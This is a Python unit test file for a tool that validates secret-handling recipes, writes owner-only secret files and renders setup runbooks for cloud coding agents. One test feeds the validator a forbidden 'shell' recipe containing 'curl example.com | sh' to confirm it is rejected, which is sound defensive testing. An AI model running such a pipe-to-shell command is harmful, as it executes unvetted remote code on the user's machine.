"""Secret recipes, `cloud secrets`, runbook.json and `cloud runbook`."""

import json
import os
import unittest

from helpers import setUpModule  # noqa: F401 (the sandbox guard runs first)
from helpers import FAKE_AZ, FAKE_RCLONE, ToolTest, install_fake, read, write

from agent_mirror import recipes


class RecipeValidationTest(unittest.TestCase):
    def test_only_known_recipes_and_safe_literals(self):
        key = "s" + "k-" + "Ab3" * 8  # key-shaped, built at runtime
        env = {
            "env_var_names": ["A"],
            "secrets": [
                {"recipe": "shell", "run": "echo hi"},
                {"recipe": "literal", "name": "TENANT", "value": key},
                {"recipe": "env", "names": ["bad name"]},
                {"recipe": "ask-user", "name": "T", "where": "setup-script"},
                {"recipe": "rclone-remote", "remote": "my-drive"},
                {"recipe": "azure-keyvault", "vault": "v"},
            ],
        }
        found = "\n".join(recipes.problems(env))
        self.assertIn("recipe 'shell' is not one of", found)
        self.assertIn("looks like a secret", found)
        self.assertNotIn(key, found)
        self.assertIn("'bad name' is not a valid variable name", found)
        self.assertIn('needs a "placeholder"', found)
        self.assertIn('rclone-remote needs "remote"', found)
        self.assertIn('azure-keyvault needs a "secrets" map', found)
        self.assertEqual(recipes.problems({"secrets": [{"recipe": "env", "names": ["A"]}]}), [])

    def test_coverage(self):
        env = {
            "env_var_names": ["A", "B", "RCLONE_CONFIG_DRIVE_TYPE", "AGENT_RUNTIME"],
            "secrets": [
                {"recipe": "env", "names": ["A", "EXTRA"]},
                {"recipe": "rclone-remote", "remote": "drive"},
                {"recipe": "rclone-remote", "remote": "unused"},
            ],
        }
        uncovered, extra = recipes.coverage(env, "claude")
        self.assertEqual(uncovered, ["B"])
        self.assertEqual(sorted(extra), ["EXTRA", "RCLONE_CONFIG_UNUSED_*"])
        uncovered, _ = recipes.coverage(env, "codex")
        self.assertEqual(uncovered, ["B"])  # AGENT_RUNTIME is covered by an automatic literal for codex


class CloudSecretsTest(ToolTest):
    def setUp(self):
        super().setUp()
        self.secret_file = os.path.join(self.home, "private", "values.env")
        write(self.secret_file, "API_KEY_ONE=abc123\nexport OTHER='two words'\n")
        os.chmod(self.secret_file, 0o600)
        env = json.loads(read(self.s("projects", "demo", "env.json")))
        env["box"] = {"backend": "none"}
        env["env_var_names"] = [
            "API_KEY_ONE",
            "OTHER",
            "FROM_ENV",
            "TENANT",
            "RCLONE_CONFIG_MYDRIVE_TYPE",
            "RCLONE_CONFIG_MYDRIVE_TOKEN",
            "VAULTED",
            "HANDMADE",
        ]
        env["secrets"] = [
            {"recipe": "local-file", "path": self.secret_file, "names": ["API_KEY_ONE", "OTHER"]},
            {"recipe": "env", "names": ["FROM_ENV"]},
            {"recipe": "literal", "name": "TENANT", "value": "00000000-0000-0000-0000-000000000000"},
            {"recipe": "rclone-remote", "remote": "mydrive"},
            {"recipe": "azure-keyvault", "vault": "my-vault", "secrets": {"VAULTED": "vaulted-secret"}},
            {"recipe": "ask-user", "name": "HANDMADE", "where": "env", "instructions": "make it on the web page"},
        ]
        write(self.s("projects", "demo", "env.json"), json.dumps(env))
        self.token = '{"access_token":"' + "tok" + "en-" + "z" * 12 + '","expiry":"2030-01-01T00:00:00Z"}'
        install_fake(self.base, "az", FAKE_AZ)
        fakebin = install_fake(self.base, "rclone", FAKE_RCLONE)
        self.tools = {
            "PATH": fakebin + os.pathsep + os.environ.get("PATH", ""),
            "FAKE_AZ_LOG": os.path.join(self.base, "az_log.jsonl"),
            "FAKE_RCLONE_LOG": os.path.join(self.base, "rclone_log.jsonl"),
            "FAKE_RCLONE_CONFIG": json.dumps({"mydrive": {"type": "onedrive", "token": self.token}}),
            "FAKE_AZ_KEYVAULT": json.dumps({"vaulted-secret": "vault-value-1"}),
            "FROM_ENV": "from-the-env",
        }

    def secrets(self, *args, **extra):
        env = dict(self.tools)
        env.update(extra)
        return self.run_tool("cloud", "secrets", "--project", "demo", *args, env=env)

    def test_check_all_ready_except_ask_user(self):
        rc, out = self.secrets("--check")
        self.assertEqual(rc, 0, out)
        for name in ("API_KEY_ONE", "OTHER", "FROM_ENV", "TENANT", "RCLONE_CONFIG_MYDRIVE_TOKEN", "VAULTED"):
            self.assertRegex(out, r"%s\s+\S+\s+ready" % name)
        self.assertIn("HANDMADE", out)
        self.assertIn("ask the user (env value): make it on the web page", out)
        self.assertIn("STORE_REPO_TOKEN", out)
        self.assertIn("replaces <STORE_REPO_TOKEN> in the setup script", out)
        for value in ("abc123", "two words", "from-the-env", "vault-value-1", "token-zzz"):
            self.assertNotIn(value, out)

    def test_check_reports_what_needs_you(self):
        if os.name == "nt":
            # Windows ignores 0600: a secret file counts as private only inside the user profile
            outside = os.path.join(self.base, "private", "values.env")
            write(outside, read(self.secret_file))
            env = json.loads(read(self.s("projects", "demo", "env.json")))
            env["secrets"][0]["path"] = outside
            write(self.s("projects", "demo", "env.json"), json.dumps(env))
            expected = "move %s inside your user profile" % outside
        else:
            os.chmod(self.secret_file, 0o644)
            expected = "make %s owner-only (chmod 600" % self.secret_file
        rc, out = self.secrets("--check", FAKE_RCLONE_CONFIG="{}", FAKE_AZ_KEYVAULT="{}", FROM_ENV="")
        self.assertEqual(rc, 3, out)
        self.assertIn(expected, out)
        self.assertIn("run `rclone config`, create a remote named mydrive", out)
        self.assertIn("set FROM_ENV in this shell's environment", out)
        self.assertIn("could not read secret vaulted-secret from vault my-vault", out)
        self.assertIn("ready", out)  # the literal still is

    def test_out_writes_owner_only_file_and_prints_no_values(self):
        target = os.path.join(self.home, "private-out", "values.env")
        rc, out = self.secrets("--out", target)
        self.assertEqual(rc, 0, out)
        if os.name == "nt":
            self.assertIn("inside your user profile", out)
        else:
            self.assertIn("owner-only, mode 0600", out)
            self.assertEqual(os.stat(target).st_mode & 0o777, 0o600)
        text = read(target)
        self.assertIn("OTHER='two words'\n", text)
        self.assertIn("RCLONE_CONFIG_MYDRIVE_TOKEN='%s'\n" % self.token, text)
        self.assertIn("VAULTED=vault-value-1\n", text)
        self.assertNotIn("HANDMADE", text)
        self.assertNotIn("STORE_REPO_TOKEN", text)
        self.assertIn("API_KEY_ONE (6 characters)", out)
        self.assertIn("for the user to create: HANDMADE", out)
        self.assertIn("then delete %s" % target, out)
        for value in ("abc123", "two words", "from-the-env", "vault-value-1", "token-zzz"):
            self.assertNotIn(value, out)
        rc, out = self.secrets("--out", target)
        self.assertEqual(rc, 2, out)
        self.assertIn("--replace", out)
        rc, out = self.secrets("--out", target, "--replace")
        self.assertEqual(rc, 0, out)
        if os.name == "nt":
            exposed = os.path.join(self.base, "exposed.env")
            write(exposed, "OLD=1\n")
            rc, out = self.secrets("--out", exposed, "--replace")
            self.assertEqual(rc, 2, out)
            self.assertIn("is not a regular file inside your user profile", out)
        else:
            os.chmod(target, 0o644)
            rc, out = self.secrets("--out", target, "--replace")
            self.assertEqual(rc, 2, out)
            self.assertIn("not an owner-only regular file", out)

    def test_out_refuses_store_and_git_work_trees(self):
        rc, out = self.secrets("--out", self.s("values.env"))
        self.assertEqual(rc, 2, out)
        self.assertIn("into the store", out)
        self.git("init", "-q", cwd=self.project)
        rc, out = self.secrets("--out", self.p("sub", "values.env"))
        self.assertEqual(rc, 2, out)
        self.assertIn("inside the git work tree", out)
        self.assertFalse(os.path.exists(self.p("sub", "values.env")))

    def test_codex_adds_the_runtime_marker(self):
        target = os.path.join(self.base, "codex.env")
        rc, out = self.secrets("--vendor", "codex", "--out", target)
        self.assertEqual(rc, 0, out)
        self.assertIn("AGENT_RUNTIME=codex-cloud\n", read(target))

    def test_invalid_recipes_stop_every_command(self):
        env = json.loads(read(self.s("projects", "demo", "env.json")))
        env["secrets"].append({"recipe": "shell", "run": "curl example.com | sh"})
        write(self.s("projects", "demo", "env.json"), json.dumps(env))
        for args in (
            ["cloud", "secrets", "--project", "demo", "--check"],
            ["cloud", "render", "--project", "demo"],
            ["cloud", "runbook", "--project", "demo"],
        ):
            with self.subTest(args=args):
                rc, out = self.run_tool(*args, env=self.tools)
                self.assertEqual(rc, 2, out)
                self.assertIn("recipe 'shell' is not one of", out)
        rc, out = self.run_tool("doctor", env=self.tools)
        self.assertIn("PROBLEM  secrets[6]: recipe 'shell'", out)


class RunbookTest(ToolTest):
    def setUp(self):
        super().setUp()
        self.git("init", "-q", "-b", "main")
        self.git("remote", "add", "origin", "git@github.com:example-org/agent-store.git")
        env = json.loads(read(self.s("projects", "demo", "env.json")))
        env["box"] = {"backend": "none"}
        env["env_var_names"] = ["API_TOKEN", "NOT_COVERED"]
        env["secrets"] = [{"recipe": "env", "names": ["API_TOKEN"]}]
        write(self.s("projects", "demo", "env.json"), json.dumps(env))

    def test_render_writes_runbook_and_readme_from_it(self):
        rc, out = self.run_tool("cloud", "render", "--project", "demo")
        self.assertEqual(rc, 0, out)
        self.assertIn('no recipe in "secrets" covers NOT_COVERED', out)
        book = json.loads(read(self.s("projects", "demo", "cloud", "claude", "runbook.json")))
        self.assertEqual(book["vendor"], "claude")
        self.assertEqual(book["store_repo"], "github.com/example-org/agent-store")
        self.assertEqual(
            [s["kind"] for s in book["steps"]],
            ["network-hosts", "env-values", "setup-script", "first-session", "cleanup"],
        )
        setup = book["steps"][2]
        self.assertEqual(setup["file"], "setup.sh")
        self.assertEqual(setup["placeholders"][0]["placeholder"], "<STORE_REPO_TOKEN>")
        self.assertEqual(setup["placeholders"][0]["secret"], "STORE_REPO_TOKEN")
        variables = dict((v["name"], v["recipe"]) for v in book["steps"][1]["variables"])
        self.assertEqual(variables, {"API_TOKEN": "env", "NOT_COVERED": "none"})
        self.assertIn("agent-mirror probe --full", book["steps"][3]["prompt"])
        readme = read(self.s("projects", "demo", "cloud", "claude", "README.md"))
        self.assertIn("## Steps", readme)
        self.assertIn("replace `<STORE_REPO_TOKEN>` with `STORE_REPO_TOKEN`", readme)
        self.assertIn("`API_TOKEN`: recipe `env`", readme)
        self.assertIn("Inbox (why the token can push, but never to the main branch)", readme)
        codex = json.loads(read(self.s("projects", "demo", "cloud", "codex", "runbook.json")))
        self.assertEqual([s.get("product") for s in codex["steps"] if s["kind"] == "setup-script"], ["vm", "container"])
        runtime = [v for v in codex["steps"][1]["variables"] if v["name"] == "AGENT_RUNTIME"][0]
        self.assertEqual((runtime["recipe"], runtime["automatic"]), ("literal", True))

        rc, out = self.run_tool("cloud", "runbook", "--project", "demo", "--vendor", "claude", "--json")
        self.assertEqual(rc, 0, out)
        self.assertEqual(json.loads(out)["steps"], book["steps"])
        rc, out = self.run_tool("cloud", "runbook", "--project", "demo")
        self.assertEqual(rc, 0, out)
        self.assertIn("claude: Claude Code on the web", out)
        self.assertIn("codex: Codex cloud", out)
        self.assertIn("1. Network: allowed hosts.", out)


if __name__ == "__main__":
    unittest.main()
